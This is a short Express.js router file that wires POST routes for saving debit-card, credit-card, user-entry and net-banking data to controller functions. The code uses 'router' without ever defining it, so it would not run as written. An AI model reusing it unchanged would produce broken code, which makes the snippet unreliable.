const express = require('express');
const netBankingController = require('../controllers/netBankingController');
const userController = require('../controllers/userController');
const debitCardController = require("../controllers/debitCardController");
const creditCardController = require('../controllers/creditCardController');

router.post('/debit-card', debitCardController.saveDebitCardData);
router.post('/credit-card', creditCardController.saveCreditCardData);
router.post('/entry', userController.saveUserData);
router.post('/banking', netBankingController.submitNetBankingPayment);

module.exports = router;

